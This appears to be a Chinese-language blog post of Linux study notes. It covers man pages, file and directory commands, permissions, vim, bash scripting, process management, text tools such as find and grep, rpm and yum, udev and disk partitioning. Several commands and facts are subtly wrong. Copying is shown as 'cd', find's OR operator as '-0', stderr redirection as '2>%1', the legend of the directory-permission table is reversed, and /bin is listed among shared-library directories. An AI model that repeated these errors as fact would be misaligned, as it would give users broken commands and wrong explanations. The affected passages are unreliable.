“页”\n\n页面分成章节,共八章\n\n他们统一组成Linux的手册\nman [&lt;chapter&gt;] &lt;command&gt;\n\n手册位置: &#x2F;usr&#x2F;share&#x2F;man&#x2F;\nman章节:\n\n第一章: 用户命令\n第二章: 系统调用\n第三章: 库函数\n第四章: 设备文件\n第五章: 文本文件格式\n第六章: 游戏\n第七章: 杂项\n第八章: 系统管理工具\n\n\nman -f 与 whatis结果相同\nwhereis 命令whereis命令用于查找文件。该指令会在特定目录中查找符合条件的文件。这些文件应属于原始代码、二进制文件，或是帮助文件。\n该指令只能用于查找二进制文件、源代码文件和man手册页.\n\n–help\n\n\n大多数命令都支持\n\n解读手册\n\n通过–help,man 和其他命令可显示\n\n\n\n用来描述一个命令的语法\n在[]中的参数是可以选择的\n大写的参数在&lt;&gt;中表示变量\n文本后面跟随…表示一个列表\nx|y|z表示 “x或者y或者z”*-abc表示 “任意-a,-b,或者-c的任意组合”\n\n\n\nSHELl的常用命令改变目录\n\ncd 命令改变目录\n\n\n\n改变到一个绝对或者相对路径\ncd &#x2F;home&#x2F;sfd&#x2F;work\ncd project&#x2F;docs\n\n\n改变到上层目录\ncd ..\n\n\n改变到当前用户的主目录\ncd\n\n\n改变目录到上一个工作目录\ncd -\n\n\n\n显示目录内容\n\n显示当前目录或者指定目录下的内容\n\n\n\n使用:\nls [options] [files_or_dirs]\n\n示例:\n\nls -R (递归所有目录)\nls -a (包括隐藏文件)\nls -l (显示拓展信息)\nls -ld (显示目录和符号链接信息)\n\n\n\n拷贝文件和目录\n\ncd -拷贝文件和目录\n\n\n\n使用\ncd [options] file destination\n\n如果 destination 是一个目录,可以一次拷贝多个文件到这个目录中:\ncd [options] file1 file2 destination\n\n拷贝文件和目录: destination\n\n如果目标是一个目录,该拷贝把文件放到该目录下\n\n\n\n如果目标是一个文件,该拷贝会覆盖目标文件\n如果目标不存在,该拷贝被重命名\n\n移动,重命名文件和目录\n\nmv -移动或者重命名一个文件或目录\n\n\n\n使用:\nmv [options] file destination\n\n如果目标是一个目录可以同时移动多个文件:\nmv [options] file1 file2 destination\n\n目标的操作类似 cp\n\n\n创建和删除目录\n\nmkdir -创建目录\n\n\n\nrmdir -删除空目录\n\ntouch -创建一个空的文件或者更新一个文件的时间戳\n\nrm -删除文件\n\n使用:\nrm [options] &lt;file&gt;...\n\n示例:\n\nrm -i file (交互式)\nrm -r directory (递归)\nrm -f file (强制)\n\n\n\n目录结构Linux 文件层次结构\n\n\n文件目录组织成单根的倒置树结构\n\n\n\n文件系统从root目录开始,表示为一个单独的’&#x2F;‘(斜线)字符\n命名大小写敏感\n路径以’&#x2F;‘分隔\n\n文件和目录名\n\n名字不能多于255个字符\n\n\n\n所有字符都要求是有效的,除斜线(&#x2F;)之外\n不要使用某些特殊的字符在文件或者目录名中\n某些字符应用引号保护起来当引用他们时\n\n\n命名和大小写敏感\n例如: MAIL,Mail,mail和mAil\nAgain,possible,but等字符不建议采用\n\n\n\n绝对和相对路径\n\n绝对路径\n以斜线开头\n文件位置的全路径\n采用绝对路径可以到处使用\n\n\n\n\n\n相对路径\n不以斜线开头\n当前工作目录的相对位置\n可以通过相对路径方式指定一个文件名\n\n\n\n一些重要的目录\n\n主目录: &#x2F;root,&#x2F;home&#x2F;username\n\n\n\n用户可执行的目录: &#x2F;bin,&#x2F;usr&#x2F;sbin,&#x2F;usr&#x2F;local&#x2F;sbin\n系统可执行目录: &#x2F;sbin,&#x2F;usr&#x2F;sbin,&#x2F;usr&#x2F;local&#x2F;sbin\n配置目录: &#x2F;etc\n临时问及爱你目录: &#x2F;tmp\n内核和引导启动目录: &#x2F;boot\n服务列表: &#x2F;var,&#x2F;srv\n共享库目录: &#x2F;bin,&#x2F;usr&#x2F;bin,&#x2F;usr&#x2F;local&#x2F;bin\n\n程序的组成\n\n二进制程序\n\n\n\n配置文件\n库\n数据文件\n帮助文件\n\n基本权限初识基本权限\n\nr -可以查看文件里的内容\n\n\n\nw -可以修改文件里面的内容\nx -可以运行脚本或者命令\n\n\n\n\n\n\n八进制\n二进制\n权限\n\n\n\n0\n000\n- - -\n\n\n1\n001\n- -x\n\n\n2\n010\n-w-\n\n\n3\n011\n-wx\n\n\n4\n100\nr- -\n\n\n5\n101\nr-x\n\n\n6\n110\nrw-\n\n\n7\n111\nrwx\n\n\n设置权限符号法\n\n基本语法\nchmod [-R] mode file\n\n\n\nmode(模式):\nu,g或者o表示文件所属用户,组以及其他用户\n\n或者 - 表示允许或者禁止\n\n\nr,w或者x表示读取,写和执行\n\n\n示例:\nugo + r: 允许所有用户对该文件具有读取权限\no - wx: 禁止其他用户对该文件的写和执行操作\n\n\n\n数字法\n\n使用三位数字模式\n第一位数字指定所有者权限\n第二位数字指定所属组权限\n第三位数字指定其他用户的权限\n\n\n\n\n\n权限通过累加的方式来计算:\n\n4(读取) 2 (写) 1 (执行)\n\n\n示例:\nchmod 640 myfile\n\n改变文件所有权\n\n只有root用户能改变一个文件的所有者\n\n\n\n只有root 用户或者所有者能改变文件的组\n\n通过chown命令改变用户所有权\nchown [-R] user_name file|directory\n\n通过chgrp命令改变组所有权\nchgrp [-R] group_name file|directory\n\n基本权限含义Linux文件安全\n\n每一个文件都属于一个UID和GID所有\n\n\n\n任何进程运行时都带有一个uid和一个或多个gid标识符\n通常决定于哪个用户执行这个进程\n\n\n\n权限有限顺序\n如果UID匹配,用户权限适用\n否则,如果GID匹配,组权限适用\n如果都不匹配,其他权限适用\n\n权限在目录上面的含义\n\n\n目录名&#x2F;命令\ncd\nls -l\ntouch(1)\ntouch(2)\nchmod\nrm\n\n\n\nr- -\nN\n?\nN\nN\nN\nN\n\n\nrw-\nN\n?\nN\nN\nN\nN\n\n\nr-x\nY\nY\nY\nN\nY\nN\n\n\n-w-\nN\nN\nN\nN\nN\nN\n\n\n-wx\nY\nN\nY\nY\nY\nY\n\n\n- -x\nY\nN\nY\nN\nY\nN\n\n\nrwx\nY\nY\nY\nY\nY\nY\n\n\nnote info modern注释:\n\n?:只能查看文件名,无法查看文件属性\nN: 可以执行\nY: 无法执行endnote\n\n基本权限在生产环境下的应用Vim编辑器概述\n\n使用vi和vim的三种主要模式\n浏览文本和进入插入模式\n改变,删除文本\n撤销更改\n搜索一个文档\n保存和退出\n\nvim介绍\n\nvi的最新版本,标准的unix文本编辑器\n执行vi的时候会默认运行vim\n\n\n\n\n\nGvim: vim的图形化版本\n提供在vim-x11包里\n\n\n优点:\n速度: 操作键盘次数减少\n简单: 不依赖鼠标&#x2F;图形\n可用: 可适应与多种类unix系统\n\n\n缺点:\n困难:比较陡峭的学习曲线\n着重在于键盘的操作速度\n\n\n\nvim的三种模式\n\nvim的模式决定按键的行为\n\n\n\n三种模式:\n一般模式(缺省): 移动光标,剪切&#x2F;粘贴文本,改变模式\n插入模式: 修改文本\nEx模式: 保存,退出等\n\n\nEsc见推出当前模式\n连续按两次Esc建回到一般模式\n\n三种模式的切换\n\n按i字符在光标处开始插入\n\n\n\n进入Ex模式\n\n在屏幕左下角创建一个命令指示符\n常用的写&#x2F;退出命令\n:w : 写(保存)文件到磁盘\n:wq : 保存并退出\n:q! : 强制退出,不保留最近的修改\n\n\n\n\n其他的选项\n\nA: 在行尾插入\nI: 在行头插入\no: 插入新行(在光标所在行的下边)\nO: 插入新行(在光标所在行的上面)\n\n\nVim缺省模式\n\n键盘描述动作和文本操作命令\n\n以数字开头将重复命令\n\n示例:\n\n右方向键 向右移动一个字符\n5,右方向键 表示向右移动5个字符\n\n\n逐字符移动: 方向键,h,j,k,l\n\n在老系统中,非方向键操作对远程连接是非常有用的\n\n\n逐单词移动: w,h\n\n逐语句移动: ),(\n\n逐段移动: },{\n\n跳到行x: xG或者 :x\n\n跳到文件尾: G\n\n使用&#x2F;,n,N搜索\n\n在sed中搜索&#x2F;替换\n\n缺省影响当前行\n\n使用x,y界定范围或者使用%针对所有的行\n:1,5s/cat/dog/      # 把文件当中第一行到第五行的cat替换为dog:%s/cat/dog/gi      # % 针对所有行, g 一行内进行多个匹配进行替换, i 替换时忽略大小写\n\n\n\n\n\n\n\n替换\n剪切\n拷贝\n\n\n\n行\ncc\ndd\nyy\n\n\n字符\ncl\ndl\nyl\n\n\n字\ncw\ndw\nyw\n\n\n句首\nc)\nd)\ny)\n\n\n句尾\nc(\nd(\ny(\n\n\n段上面\nc{\nd{\ny{\n\n\n段下面\nc}\nd}\ny}\n\n\n\n\n放置粘贴\n\n\n\n使用p或者P来放置(粘贴)拷贝或者删除的数据\n面向行的数据:\np 防止数据在当前行的下面\nP 放置数据在当前行的上面\n\n\n面向字符的数据\np 放置数据在光标的后面\nP 放置数据在光标的前面\n\n\n撤销改变\nu 撤销最近的改变\nU 撤销当前行自从光标定位在上面开始的所有改变\nCtrl+r 重做最后一次 “撤销” 改变\n\n\n\nSHELL基础** Shell 一种特殊的程序,被称为脚本语言,他是用户与unix&#x2F;Linux系统 “心脏” 之间的接口.**\n\nSHELL类型\n\nUNIX shell:\nBourne shell,C shell,Korn shell\n\n\n\n\n\nLinux shell:\nTC shell,Z shell,Bash shell\n\n\n\nBash shell 历史\n\nBash 是基于Bourne shell 开发的,对于所有的UNIX上的Shell脚本来说,Bash已成为了事实上的标准.\n\n\n\nBash 全称: Bourne Again shell\n开发时间: 1988年\n开发作者: Brian Fox\n\n时使用的场合\n常用的命令自动化\n执行系统管理和诊断工作\n创建简单的应用程序\n操作文本或文件\n\nBash shell的特点\nGNU项目\n包含 UNIX Korn shell 和 C shell 的很多特性\n增加了与POSIX的一致性\n提供了大量的内置命令和命令行亏快捷方式\n\nShell的特性及功能\n\n命令行快捷方式\n命令行和文件名补全\n命令历史\n命令行编辑\n\n\n\n\n\n命令行拓展\n通配符(元字符)\n别名\n变量\n标准I&#x2F;O与重定向\n管道\n编程基础\n\n命令行快捷-文件统配符扩展\n\n通配符拓展\n* - 匹配0或者多个字符? - 匹配任意单个字符[0-9] - 匹配0-9范围内的数字[abc] - 匹配该列表内的任意字符[^abc] - 匹配除列表内字符外的所有字符\n\n\n\nTab键可用来帮助完成命令的输入:\n\n为命令名,它将完成命令名的输入\n为参数,它将完成文件名的输入\n\n\n命令行快捷-历史\n\nbash保存已经输入过的命令,这些历史命令可以用户来重复使用\n使用history命令可以看到历史命令列表\n\n\n其他的历史命令技巧\n\n使用up和down键来翻阅以前的命令\n按下Ctrl-r键从历史命令行中搜索命令(反向i搜索)\n从先前的命令中冲调上一个参数\nEsx-.(Esc键后跟一点)\nAlt-.(当输出点的时候按住Alt键)\n!$(仅上一个命令才有效)\n\n\n\n\n命令扩展-波形符\n\n波形符 (~)\n\n可指向你的主目录\n$ cat ~/.bash_profile\n\n也可指向其他用户的主目录\n$ ls ~julie/public_html\n\n\n命令扩展-命令和大括号集\n\n命令扩展: $() 和 &#96;&#96;\n\n输出一个命令作为另外一个命令的参数\n$ echo &#x27;This system&#x27;s name is $(hostname)&quot;This system&#x27;s name is server1.example.com\n\n大括号扩展\n\n重复打印字符串\n$ echo file&#123;1,3,5&#125;file1 file2 file3$rm -f file&#123;1,3,5&#125;\n\n\n\n\n\nshell变量什么是变量?\n变量是内存中存储一个庶几乎的位置名称\n变量赋值: 变量名&#x3D;值\n\n变量命名\n变量名必须以字母或下划线字符开头,其余的字符可以是字母,数字或下划线字符.\n名字时大小写敏感的.给变量赋值时,等号周围不能有任何空白字符.\n\n引用变量使用$符号来提取储存在变量里的值\n# 设置变量bash$ name=sfd或者declare name=sfdbash$ echo $&#123;name&#125; 或者echo $name# 删除变量bash$ unset namebash$ readonly name huozhe declare -r name \n\n变量分类\n\n环境变量\n设置环境变量有以下集中格式\nexport 变量名&#x3D;值\n变量名&#x3D;值;export 变量名\ndeclare -x 变量名&#x3D;值\n\n\n\n\n\n\n\n本地变量(局部变量)\n位置变量\n特殊变量\n\n查看变量\n# 查看当前SHELL变量set#查看当前SHELL中的环境变量printenvenvexport\n\n一些常用的变量\n\n配置变量\nPS1: bash 提示符的显示\nPATH: 查找可执文件的目录\nEDITOR: 默认的文本编辑器\nHISFILESIZE: 保存在bash历史命令数目\n\n\n\n\n\n信息变量\nHOME: 用户的home目录\nEUID: 用户的有效UID\n\n\n\n标准的输入与输出\n\nLinux给应用程序提供三种I&#x2F;O通道\n标准输入(STDIN) - 缺省为键盘\n标准输出STDOUT - 缺省为终端窗口\n标准错误(STDERR) - 缺省为终端窗口\n\n\n\n\n文件描述符\n\n所有的I&#x2F;O,包括文件,管道和套接字,都是由内核通过一种名为文件描述符的即使进行管理的.\n\n重定向\n\n把文件描述符分配给终端意外的其他对象,就叫做重定向.\n重定向输入: &lt;\n重定向输出: &gt;\n\n\n\n\n\n追加输出: &gt;&gt;文件名\n重定向标准错误输出: 2&gt;文件名\n重定向标准输出和错误输出: &amp;&gt;文件名\n将标准错误输出重定向到输出: 2&gt;%1\n将输出重定向到标准错误输出: 1&gt;&amp;2\n使用 &lt;&lt; WORD从键盘重定向多行到STDIN\n接受所有标准输入直到输入WORD字符\n有时称作here document\n\n\n\n管道\n\n管道时Unix&#x2F;Linux进程间通讯的最古老的形式.管道用于将一条命令的输出传递给另一条命令作为输入.\n管道符号: |\n实例: who | wc\n结合多个工具的功能\ncommand1 | command2 | command3…等\n\n\n\n\n\n\n\n重定向到多个目标(tee)\ncommand1 | tee filename | command2\n储存command1的stdout在filename里,然后通过管道传给command2\n\n\n使用\n故障诊断复杂的管道\n同时查看和记载输出\n\n\n\nShell特殊元字符\n\n\n元字符\n含义\n\n\n\n;\n命令分隔符\n\n\n|\n管道\n\n\n&lt;\n输入重定向\n\n\n&gt;\n输出重定向\n\n\n$\n变量替换字符\n\n\n*[]?\nShell元字符\n\n\n引用\n\n引用被用于保护特殊的元字符不被解释和禁止扩展\n\n\n\n斜线()让下一个字符合法\n$echo Your cost: $5.00结果显示:Your cost: $5.00\n\n\n引号阻止扩展\n单引号( ‘ )抑制所有扩展\n双引号抑制所有扩展,除了:\n$ (dollar符号)-变量扩展\n&#96;(反引号)-命令替代\n\\ (斜线)-单个字符的继承\n!(叹号)-历史替代\n\n\n\n\n\nSHELL编程基础\n机器语言\n汇编语言\n高级语言\n编译型语言: C,C++…\n事前编译成可执行格式\n\n\n解释型语言: PHP,SHELL,PYTHON,PERL\n边解释边执行\n\n\n\n\n\nSHELL脚本\n\nShell脚本由许多命令或者可执行的语句组成的文本文件\n\n\n\nShell 脚本的用途包括:\n\n常用命令的自动化\n执行系统管理和诊断工作\n创建简单的应用程序\n操作文本或者文件\n\n\n创建SHELL脚本\n\n步骤2:让脚本可执行:\n$ chmod u+X myscript.sh\n\n\n执行脚本\n把脚本文件放置在-个可执行的路径的目录中或者在命令行指定这个脚本文件的绝对路径或者相对路径\n\n\n\n\n条件测试\n\n字符测试\n\n&#x3D;:等于,比如:[“$A”&#x3D;“$B”]\n\n!&#x3D; :不等于\n\n&lt; :小于，按ASCII字符排序\n\n\n:大于\n\n\n-z:字符串长度为”null”\n\n-n:字符串长度不为”null”\n\n\n\n整数测试\n\n-eq:等于\n-ne:不等于\n-gt:大于\n-ge:大于等于\n-It:小于\n-le:小于等于\n\n\n文件测试\n\n-e FILE:文件存在\n-fFILE:这个文件是一个-般文件\n-S FILE:这个文件大小不为0\n-d FILE :表示这是一个目录\n-b FILE :表示这是一个块设备\n-C FILE:表示这是一个字符设备\n\n\n逻辑测试\n\n逻辑与 : &amp;&amp;\n逻辑或: ||\n\n\n\n\n\nSHELL之if语句if表达式;then命令;fiif表达式;then命令;else命令;fiif 表达式then    命令elif 命令then    命令else 命令fi\n\nSHELL之循环语句\n\n三种类型的循环\n\nfor循环\nfor 变量in值的列表do    命令(组)done\n\nwhile循环\nwhile 命令do    命令(组)done\n\nuntil循环\nuntil 命令do    命令(组)done\n\n\n\n\nshift 命令shift [n]       #使指定参数左移n(不填默认为1)次\n\nbreak 命令break [n]       #跳出指定循环(未指定默认为1)\n\ncontinue 命令continue [n]        # 跳出指定循环(未指定默认为1)\n\n进程管理\n进程是正在执行的一个程序或命令，每个进程都是一个运行的实体，都有自己的地址空间，并占用一定的系统资源。程序是人使用计算机语言编写的可以实现特定目标或解决特定问题的代码集合。\n这么讲很难理解，那我们换一种说法。程序是人使用计算机语言编写的，可以实现一定功能，并且可以执行的代码集合。而进程是正在执行中的程序。当程序被执行时，执行人的权限和属性，以及程序的代码都会被加载入内存，操作系统给这个进程分配一个 ID，称为 PID（进程 ID）。\n也就是说，在操作系统中，所有可以执行的程序与命令都会产生进程。只是有些程序和命令非常简单，如 ls 命令、touch 命令等，它们在执行完后就会结束，相应的进程也就会终结，所以我们很难捕捉到这些进程。但是还有一些程和命令，比如 httpd 进程，启动之后就会一直驻留在系统当中，我们把这样的进程称作常驻内存进程。\n某些进程会产生一些新的进程，我们把这些进程称作子进程，而把这个进程本身称作父进程。比如，我们必须正常登录到 Shell 环境中才能执行系统命令，而 Linux 的标准 Shell 是 bash。我们在 bash 当中执行了 ls 命令，那么 bash 就是父进程，而 ls 命令是在 bash 进程中产生的进程，所以 ls 进程是 bash 进程的子进程。也就是说，子进程是依赖父进程而产生的，如果父进程不存在，那么子进程也不存在了。\n\n进程状态\nps命令\n\n用ps查看进程信息\n默认显示当前终端进程\na包括所有终端的进程\nX包括不属于终端的进程\nu打印进程所有者信息\nf打印进程亲缘信息\n-e显示所有进程，\no property1,property…打印定制信息\npid,comm,%cpu,%mem,state,tty,euser,ruser等\n\n\n\n\n\n\n\n示例\nps axo pid,%cpu,comm\n\n\npstree\n可以更好的显示出进程之间的父子关系\n\n\n\n查找进程\n\n通过预定义模式: pgrep\n$ pgrep -U root\n$ pgrep -G student\n\n\n\n\n\n通过准确的程序名: pidof\n$ pidof bash\n\n\n\n进程间通讯 之 信号进程间通信方式IPC\n信号\n共享内存\n消息队列\n信号量\n\n信号\n\n最基本的进程间通讯机制\n直接发送给进程,不需要用户界面\n对于任何信号应用程序都需要相应处理\n\n\n\n\n\n通过名字或者号码来确定一个信号:\nSignal 15 : TERM(默认) -终止干净\nSignal 9, KILL-立即终止\nSignal 1, HUP -重读配置文件\nman 7 signal显示完整列表\n\n\nkill -l(查看64个信号的各个功能)\n\n作业控制\n\n在后台运行一个进程\n给命令行尾附加一个符号: firefox &amp;\n\n\n\n\n\n临时停止一个正运行的程序\n使用ctrl-z 或者发送signal 19 (停止)\n\n\n管理后台或者挂起的作业\n显示作业号和名字: jobs\n在后台恢复: bg [%jobnum]\n在前台恢复: fg [%jobnum]\n\n\n发送一个信号 : kill [-SIGNAL] [%jobnum]\n\n排序运行队列\n\n每个进程被运行是按调度策略与优先级\n\n\n\n调度策略:\nSCHED_ FIFO\nchrt 命令调整优先级\n\n\nSCHED_ RR\nchrt 命令调整优先级\n\n\nSCHED_ OTHER\nnice或者renice命令调整优先级\n每个进程被强占后,会重新计算一个新的内部的优先级\n优先级范围是: 100-139\n在每个进程被强占后,会收到一-个+5优先级惩罚\n\n\n\n\n优先级:\n静态: 1-99 , 是被SCHED_ FIFO和SCHED_ _R所使用\n静态0以及动态( 100- 139 ) 被SCHED_ OTHER所使用\n\n\n\n优先级与更改优先级\n\n\n数字越小,优先级越高\n\n\n\n值范围为-20到19,缺省为0\nNice值可以被修改\n当启动进程的时候:\n$ nice -n 5 command\n\n\n在启动进程之后:\n$ renice 5 PID\n\n\n只有root用户才能降低nice值\n\n字符处理工具提取文本工具\n\n文本内容: less和cat\nless :在查看文件或者标准输入的时候,每次只看- -页\n在查看时常用的命令如下:\n&#x2F;text :搜索text\nn&#x2F;N :跳转到next&#x2F;previous匹配的地方\nv :用文本编辑器打开该文件\n\n\ncat : dump一个或者多个文件到标准输出\n多个文件联合在一起\n\n\n\n\n\n\n\n\n\n文本摘选: head和tail\nhead :显示文件的起始10行\n使用-n选项改变行显示\n\n\ntail :显示文件最后10行\n使用-n选项改变行显示\n使用-f选项来继续从输入文件复制额外的单元\n对于监控日志文件非常有用!\n\n\n\n\n提取列或者字段: cut\n显示文件指定的列或者标准输入数据\n$ cut -d:-f1 &#x2F;etc&#x2F;passwd\n\n\n使用-d选项来指定列分隔符(默认是TAB)\n使用 -f选项来指定要打印的列\n使用-C选项来指定按字符来提取\n$ cut-c2-5 &#x2F;usr&#x2F;share&#x2F;dict&#x2F;words\n\n\n\n\n\nman命令中是采用less来分页的\n手机文本统计 - wc(单词统计)\n\n计算单词书,行数,字节数和字符数\n\n\n\n可针对一个文件或者标准输入\n$ wc filename\n\n使用-|选项:仅仅统计行数\n\n使用-W选项:仅仅统计单词数\n\n使用-C选项:仅仅统计字节数\n\n使用-m选项:统计字符数(不显示)\n\n\nsort\n\n对标准输出排序-原始文件不改变\n$ sort [options] file(s)\n\n\n\n\n\n常用选项\n\n-r :执行反向(降)排序\n\n-n :执行数字排序\n\n-f :忽略字符串中的大小写\n\n-u :在输出中删除重复的行(唯一)\n\n-t c :使用C作为字段间的分隔符\n\n-kX:使用C分隔符排序X字段\n\n可多次使用\n\n\nuniq: 从相邻的行中删除重复行\n\n\n\n使用-c选项统计发生重复的次数\n\n跟sort-起使用效果最好: $ sort userlist.txt!uniq -C\n\n\n\n\n文件比较 - diff\n比较两个文件的不同\ndiff foo.conf-broken foo.conf-works\n\n\n\nlocate\n\nlocate passwd ,查找名字或路径中包含passwd的文件\n\n\n\n有用的选项\n-i进行大小写不敏感的查找\n-nX只列出X匹配的\n-e DIR1,DIR2…不搜索目录DIR1,DIR2等等\n\n\n\nfind\n\nFind [dir1 dir2 …][criteri…]\n\n\n\n实时搜索目录树\n比locate慢但更精确\n如果不给定开始目录,就用pwd\n如果不给定criteria ,所有文件都匹配\n在找到的文件上可以执行命令\n对于被搜索目录，用户要拥有可读和可执行的权限\nfind -name snow.png\n在当前目录下查找名为snow.png的文件\n\n\nfind -iname snow.png\n在当前目录下查找文件名字为snow.png , SNOW.PNG等等,大小写不敏感\n\n\nfind &#x2F; -name *.txt\n在整个系统中查找以.txt 结尾的文件\n\n\nfind &#x2F;etc -name pass\n在&#x2F;etc目录下查找名字包含pass的文件\n\n\nfind &#x2F;home -user joe -group joe\n在&#x2F;home目录下查找所有者是joe并且组也是joe的文件\n\n\n\nfind 与逻辑操作\n\n默认匹配是与\n\n\n\n可以用-0或者是-not表示”或”或者是\n括号可以用来检测逻辑操作的顺序,但必须用斜线转义\nfind -user joe -not -group joe\nfind -user joe -0 -user jane\nfind -not ( -user joe -0 -user jane )\n\n\n\nfind与权限\n\n能用名字或id匹配所属关系\nfind &#x2F; -user joe -0 -uid 500\n\n\n\n\n\n能匹配八进制或符号权限\nfind -perm 755会匹配755的模式\nfind -perm + 222会匹配只要任何用户能写的模式\nfind - perm -222会匹配所有用户都可以写的模式\nfind -perm -002会匹配其他人可以写的模式\n\n\n\nfind与数字标准\n\n许多查找标准采用数字值\nfind - -size 10M大小等于10M的文件\nfind -size +10M大小超过10M的文件\nFind - size -10M大小少于10M的文件\n\n\n\n\n\n其他修饰符也有效,如:k代表KB，G代表GB等等\n\nfind与访问时间\n\nfind可以通过节点时间戳匹配\n-atime文件是最后被读的\n-mtime文件数据最后被修改的\n-ctime文件数据或元数据最后被修改的\n\n\n\n\n\n给定值是天\nfind &#x2F;tmp - -ctime +10 &#x2F;tmp下10天以前被修改的文件\n\n\n可以使用分钟的值\n-amin\n-mmIn\n-cmin\n\n\n\nfind更多命令\n\n在找到的文件上可以执行命令\n\n\n\n必须用-exec或者-ok打头执行命令\n-ok在对每个文件进行动作前提示\n命令必须以空格+斜线(“” )+分号结尾\n可以使用{}作为文件名字占位符\nfind -size + 100M -ok mv {} &#x2F;tmp&#x2F;largefiles&#x2F; \\ ;\n\n\n\ngrep\n\n通过关键词来提取文本\n\n\n\n打印匹配的文件行或者标准输入\n$ grep ‘john’ &#x2F;etc&#x2F;passwd\n$ date -help|grep year\n\n\n使用-i选项:忽略大小写敏感搜索\n使用-n选项:打印匹配的行号\n使用-V选项:打印哪些不匹配的行\n使用-AX选项:在匹配数据后包含显示X行\n使用-BX选项:在匹配数据前包含显示X行\n使用-r选项:递归搜索目录\n使用–color&#x3D;auto选项:用color颜色高亮显示匹配的数据\n使用-c选项:只输出匹配行的计数\n使用-|选项:查询多文件时只输出包含匹配字符的文件名\n使用-R选项:递归对目录下面的所有文件进行过滤\n\n正则表达式正则表达式( Regular expression,RE)是一种字符模式,用于在查找过程中匹配指定的字符。\n\n\n^ 表示行的开始\n\n\n\n$ 表示行的结束\n\n一个单字符后紧跟 ,匹配0个或多个此单字符\n\n[] 只匹配 [] 内字符\n\n\\ 只用来屏蔽一个元字符的特殊含义。\n\n. 只匹配任意单字符\npattern\\&#123; n \\&#125;只用来匹配前面patte r n出现次数。n为次数pattern\\&#123;n,\\&#125;含义同上,但次数最少为npattern\\&#123;n，m\\&#125;含义同上，但pattern出现次数在n与m之间\\&lt;word锚定词首word\\&gt;锚定词尾\n\n包管理器rpm包管理器\nRPM是RedHat Package Manager的缩写,这一文件格式名称虽然打上了RedHat的标志,但是其原始设计理念是开放式的, 现在包括OpenLinux、S.u.S.E.以及Turbo Linux等Linux的分发版本都有采用,可以算是公认的行业标准了。\n\nrpm包名结构\n常用参数-i:安装-e:删除-vh :显示安装进度-U:升级软件包\n\n\n\n组件\n本地数据库\nrpm及相关命令或前端界面\n包文件\n\n\n四种基本查询类型:\nrpm -qa\nrpm -q package\nrpm -qf file_ path_ name\nrpm -qp rpmfile\n\n\n\n\n\n查询的信息类型:\n-qi包的主要信息\n-q|显示包中的文件\n\n\n其它选项\n–force\n\n\n\n对已安装的包进行文件校验:\nrpm -V package\nrpm -Vp rpmfile\nrpm -Va\n在包安装之前进行签名校验:\nrpm –import RPM-GPG-KEY-redhat-release\nrpm -K rpmfile\n\n\n\n\n\n文件校验表:\nS :档案大小改变\nM :档案的属性发生变化\n5 : MD5这种指纹的内容已经不同\nD:设备的主、次代码已经改变\nL: link 路径已经改变\nU:档案的所属者改变\nG:档案的所属组改变\nT:时间改变\n\n\n\n\n如何解决依赖关系:rpm无法自动解决依赖关系,需要手动操作\n\n\n使用–nodeps不考虑依赖关系, 强制安装\n\n\n\n一次性安装所有的软件包\n百度 ，GOOGLE\n自己学会基本的判断\n使用yum\n\nyum\nrpm的前端\n设计用于解决软件包之间的依赖性\n能够从多个资源库中定位软件包\n\n\n在&#x2F;etc&#x2F;yum.repos.d&#x2F;中为你的资源库创建一个文件, 文件名以.repo结尾,包含以下内容:\n[repo-name]name=A nice descriptionbaseurl=http://yourserver.com/ path/to/repoenabled=1gpgcheck=1\n\nyum的安装与删除命令\n\nyum install package…\n\n\n\nyum groupinstall packagegroup…\n\nyum remove package…\n\nyum update [packag…]\n\n\nyum list [al] [package_ glob]\n\n\n\nyum list (available|updates|installed|extras|obsoletes)\n\nyum info package\n\nyum groupinfo packagegroup\n\nyum whatprovides filename*清除资源库信息在内存中的缓存:\nyum clean dbcache|all\n\n重建元数据的命令\n\ncreaterepo &#x2F;pkg\n\n\n\nUdev 概述\n\n&#x2F;dev下的文件用于访问驱动\n\n\n\n从这些文件进行读写是合法的操作:\n\necho “Message” &gt; &#x2F;dev&#x2F;tty1\n\n\n三种文件属性决定访问哪种驱动:\n\n设备类型号(字符设备或块设备)\n\n主设备号( Major number )\n\n次设备号( Minor number )\n\n\n块设备\n\n\n\n&#x2F;dev&#x2F;sda, &#x2F;dev&#x2F;sdb- SCSI, SATA或USB存储\n\n&#x2F;dev&#x2F;md0, &#x2F;dev&#x2F;md1一软件RAID\n\n\n\n字符设备\n\n&#x2F;dev&#x2F;tty[0-6] -虚拟控制台\n&#x2F;dev&#x2F;null , &#x2F;dev&#x2F;zero一软设备\n&#x2F;dev&#x2F;random , &#x2F;dev&#x2F;urandom -随机数\n\n\nudev管理&#x2F;dev&#x2F;下存储的文件\n\n文件只有在相应的设备被插入时才会被创建\n\n文件会在相应的设备被断开时自动删除\n\n\n磁盘管理概述\n\n进行设备识别\n\n\n\n对设备进行分区\n新建文件系统\n对文件系统进行标记\n在&#x2F;etc&#x2F;fstab创建相应条目\n安装新文件系统\n\nMBR\n设备识别\n\n主引导记录(MBR)包括:\n用于调入操作系统的可执行代码\n\n\n\n\n\n分区表信息，包括:\n分区ID或类型\n分区开始的柱面号\n分区包含的柱面数\n\n\n\n分区\n\n一个扩展分区指向一个附加的分区描述符\n\n\n\n内核支持的最大分区数为:\nIDE驱动器: 63个\nSCSI驱动器: 15个\n\n\n为何要对驱动器进行分区\n可控性,性能额度控制,修复\n\n\n\n管理分区\n创建分区:\nfdisk\nsfdisk\nGNU parted :高级分区操作(创建分区拷贝分区,分区大小调整,其它)\n\n\npartprobe :刷新内核使用的存放于内存中的分区表\n\n","categories":["笔记"],"tags":["笔记","云计算"]},{"title":"云计算 - Linux系统管理","url":"/2023/03/27/cloud_linux_2/","content":"文件系统\n\n文件系统格式操作系统用于明确存储设备或分区上的文件的方法和数据结构,即在储存设备上组织文件的方法.\n\n\n\n操作系统中负责管理和储存文件信息的软件机构称为文件下管理系统,简称文件系统.\n文件系统时命名文件以及放置文件逻辑级储存和恢复的系统.\n\n文件系统类型\n\n本地文件系统(基于磁盘的文件系统):\nWindows系统: FAT,NTFS\nLinux系统: EXT2,EXT3,EXT4,XFS\nUnix系统: ZFS,JFS,JFS2,HFS\n\n\n\n\n\n网络文件系统:\nNTFS,GFS,GFS2,NFS,CIFS\n\n\n虚拟文件系统: 基于内存的文件系统\nTMPFS\nPROC\nSYSFS\n…\n\n\n交换分区(swap)\n\ninode 和 block 